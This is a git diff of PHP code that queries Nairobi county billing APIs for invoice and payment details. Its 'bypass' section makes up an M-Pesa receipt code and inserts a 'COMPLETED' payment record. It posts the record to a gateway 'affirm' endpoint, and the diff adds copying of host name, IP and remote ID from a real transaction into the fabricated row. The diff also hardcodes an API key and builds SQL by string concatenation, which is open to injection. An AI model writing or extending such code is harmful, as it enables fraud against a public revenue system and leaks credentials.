@@ -310,7 +310,7 @@ if ($type == 'invoice2') {
 
 
 if (isset($invoice2)) {
-    $url = 'http://192.168.100.116/sbp/applications/get_invoice_details?invoice_no=' . $invoice2;
+    $url = 'https://nairobiservices.go.ke/api/sbp/applications/get_invoice_details?invoice_no=' . $invoice2;
     $data = [];
     if (isset($_SESSION['token'])) {
         $invtk = $_SESSION['token'];
@@ -324,7 +324,7 @@ if (isset($invoice2)) {
 }
 
 if (isset($authenticate)) {
-    $url = 'http://192.168.100.116/sbp/applications/get_invoice_details?invoice_no=' . $authenticate;
+    $url = 'https://nairobiservices.go.ke/api/sbp/applications/get_invoice_details?invoice_no=' . $authenticate;
     $data = [];
     if (isset($_SESSION['token'])) {
         $invtk = $_SESSION['token'];
@@ -337,7 +337,7 @@ if (isset($authenticate)) {
 
     function generate_token($customer_id)
     {
-        $token = httpGet('http://192.168.100.116/authentication/auth/generate_customer_token', ['customer_no' => $customer_id], '');
+        $token = httpGet('https://nairobiservices.go.ke/api/authentication/auth/generate_customer_token', ['customer_no' => $customer_id], '');
         $tk = json_decode($token, true);
         return $tk['token'];
     }
@@ -346,7 +346,7 @@ if (isset($authenticate)) {
     {
         $token = generate_token($customer_id);
         $headers = ['Authorization:Bearer ' . $token];
-        $dt12 = httpGet('http://192.168.100.116/authentication/profile/bills', [], $headers);
+        $dt12 = httpGet('https://nairobiservices.go.ke/api/authentication/profile/bills', [], $headers);
         $dt121 = json_decode($dt12, true);
         foreach ($dt121['bills_List'] as $row) {
             if ($row['bill_no'] == $invoice) {
@@ -361,7 +361,7 @@ if (isset($authenticate)) {
     }
 
     //// echo dt1($dt1, $head, $mini_head);
-    $url = 'http://192.168.100.116/authentication/bill/transaction/details';
+    $url = 'https://nairobiservices.go.ke/api/authentication/bill/transaction/details';
     $data = ['invoice_no' => $authenticate];
     $headers = [];
 
@@ -383,7 +383,7 @@ if (isset($authenticate)) {
 }
 
 if (isset($monitor)) {
-    $url = 'http://192.168.100.116/sbp/applications/get_invoice_details?invoice_no=' . $monitor;
+    $url = 'https://nairobiservices.go.ke/api/sbp/applications/get_invoice_details?invoice_no=' . $monitor;
     $data = [];
     if (isset($_SESSION['token'])) {
         $invtk = $_SESSION['token'];
@@ -395,7 +395,7 @@ if (isset($monitor)) {
     $dt12 = json_decode(httpGet($url, $data, $headers), true);
 
     //// echo dt1($dt1, $head, $mini_head);
-    $url = 'http://192.168.100.116/authentication/bill/transaction/details';
+    $url = 'https://nairobiservices.go.ke/api/authentication/bill/transaction/details';
     $data = ['invoice_no' => $monitor];
     $headers = [];
 
@@ -465,7 +465,7 @@ if (isset($monitor)) {
 }
 
 if (isset($invoice)) {
-    $url = 'http://192.168.100.116/authentication/bill/transaction/details';
+    $url = 'https://nairobiservices.go.ke/api/authentication/bill/transaction/details';
     $data = ['invoice_no' => $invoice];
     $headers = [];
 
@@ -476,7 +476,7 @@ if (isset($invoice)) {
 if (isset($bypass)) {
     include './rejuv/conn.php';
 
-    $stmt2 = $conn2->prepare("SELECT id, paybillBal FROM mpesaTransactions ORDER BY id DESC LIMIT 1");
+    $stmt2 = $conn2->prepare("SELECT id, paybillBal, host_name, host_ip, remote_id FROM mpesaTransactions ORDER BY id DESC LIMIT 1");
     $stmt2->execute();
     $up = $stmt2->fetch();
 
@@ -490,16 +490,16 @@ if (isset($bypass)) {
     $timeFormats = getCurrentTimeFormats();
     $bypassAmt = (float)$bypass['amount'];
 
-    $bypass['url'] = 'http://192.168.100.116/gateway/taifa/nrs/affirm';
+    $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';
 
     //die(json_encode($url));
 
-    //$url = 'http://192.168.100.116/authentication/bill/confirm_payment';
+    //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
     $bty = explode('-', $bypass['invoice_no']);
     $bty[1] = strtoupper($bty[1]);
     $code = generateMpesaCode();
     $data = array(
-        "apiKey" => "",
+        "apiKey" => "216424b0ce94d4682ef240fd67e30daf600be171",
         "type" => "mpesa",
         "billNumber" => (string) $bypass['invoice_no'],
         "billAmount" => $bypassAmt,
@@ -533,9 +533,8 @@ if (isset($bypass)) {
     $sqldata = trim(json_encode($data), '"');
 
 
-    $sql = "insert into `mpesaTransactions` (`Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `id`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`) values (NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Success', NULL, " . $newId . ", '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . str_replace("'", '', $bypass['custname']) . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 1, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')";
-
-
+    $sql = "insert into `mpesaTransactions` ( `Confirmation Response`,  `MpesaValidation`,  `PushedComments`,  `PushedToReconcile`,  `accNo`,  `amount`,  `apiCode`,  `comment`,  `cont`,  `id`,  `logDate`,  `mobileno`,  `mpesaName`,  `paybillBal`,  `phone_number`,  `receiptNo`,  `resultoutput`,  `shortCode`,  `sid`,  `status`,  `transactionTime`,  `validation Response`, `host_name`, `host_ip`, `remote_id` ) values ( NULL,  'COMPLETED',  NULL,  '0',  '" . $bypass['invoice_no'] . "',  " . $bypass['amount'] . ",  '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',  'Success',  NULL,  " . $newId . ",  '" . $timeFormats['withSeparators'] . "',  '" . $custcont . "',  '" . str_replace("'", '', $bypass['custname']) . "',  " . $newBal . ",  '',  '" . $code . "',  '" . $sqldata . "',  '6060047',  NULL,  1,  '" . $timeFormats['withoutSeparators'] . "',  'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction', '" . $up['host_name'] . "', '" . $up['host_ip'] . "', '" . $up['remote_id'] . "' )";
+   
 
     $headers = [];
 
@@ -543,8 +542,9 @@ if (isset($bypass)) {
     //$dt1 = json_decode($dt0, true);
     //unset($bypass['success']);
     //$dt1 = $bypass;
+    //5652859
 
-    $stmt2 = $conn2->prepare("insert into `mpesaTransactions` (`Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `id`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`) values (NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Success', NULL, " . $newId . ", '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . str_replace("'",'',$bypass['custname']) . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 1, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')");
+    $stmt2 = $conn2->prepare($sql);
     $stmt2->execute();
 
     $billType = "";
